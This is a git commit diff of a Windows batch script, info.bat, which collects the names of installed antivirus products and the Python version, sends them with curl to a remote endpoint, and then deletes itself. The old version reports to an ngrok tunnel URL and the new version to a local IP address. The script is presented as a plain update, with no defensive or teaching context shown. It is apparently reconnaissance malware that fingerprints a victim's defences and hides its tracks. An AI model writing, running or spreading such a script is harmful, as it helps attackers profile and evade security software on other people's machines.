5999ebe21fcf8bef04695eb82714513eb19f8903
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-07 00:17:26 +0300

    Update info.bat

--- info.bat
+++ info.bat
@@ -1,7 +1,11 @@
 @echo off
-for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do set "antivirus=%%a"
-echo Antivirus Information: %antivirus%
-for /f "delims=" %%b in ('python --version 2^>^&1') do set "python_version=%%b"
-echo Python Version: %python_version%
-curl --verbose --get --data-urlencode "Antivirus=%antivirus%" --data-urlencode "PythonVersion=%python_version%" https://0165-197-35-49-198.ngrok-free.app
+setlocal enabledelayedexpansion
+for /f "delims=" %%a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName ^| findstr /r /v "^$"') do (
+    set "antivirus=!antivirus! %%a"
+)
+for /f "delims=" %%b in ('python --version 2^>^&1') do (
+    set "python_version=%%b"
+)
+curl --verbose --get --data-urlencode "Antivirus=!antivirus!" --data-urlencode "PythonVersion=!python_version!" http://192.168.1.16:8000
 del "%~f0"
+
